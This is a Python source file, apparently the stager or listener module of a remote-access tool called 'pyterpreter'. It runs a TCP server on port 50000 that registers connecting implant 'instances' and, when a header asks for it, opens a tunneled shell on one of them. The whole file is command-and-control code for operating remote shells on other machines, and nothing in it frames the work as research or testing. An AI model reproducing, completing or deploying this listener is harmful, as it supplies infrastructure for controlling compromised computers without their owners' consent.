import socket
import my_logging
from threading import Thread
from typing import Tuple
from base64 import b64decode

from pyterpreter import Core, Message
from instance import Instance
from instance_manager import InstanceManager
from reply_handler import ReplyHandler

PORT = 50000
logger = my_logging.Logger('STAGER')


def _handler(sock: socket.socket, address: Tuple[str, int]):
    header = Core.receive_line_from_sock(sock)
    logger.debug(f'Header: {header}')
    header_parts = [b64decode(header_part).decode() for header_part in header.split(b':')]
    logger.debug(f'Connected on {address[0]}:{address[1]} {header_parts}')
    if len(header_parts) == 1:
        if not InstanceManager.try_add(Instance(address[0], address[1], sock, header_parts[0])):
            sock.close()
    elif header_parts[1] == Message.OPEN_SHELL_TUNNELED:
        logger.debug('Trying to open shell')
        instance = InstanceManager.get_by_conversation_uid(header_parts[2])
        ReplyHandler.handle_open_shell(instance, sock)
    else:
        raise Exception(f'Unknown header {header_parts}')


def initialise(block=False):
    if block:
        server = socket.create_server(('', PORT))
        logger.info('Started staging handler')
        while True:
            sock, address = server.accept()
            logger.debug(f'New connection on {address}')
            Thread(target=_handler, args=(sock, address), daemon=True).start()
    else:
        Thread(target=initialise, args=(True,), daemon=True).start()

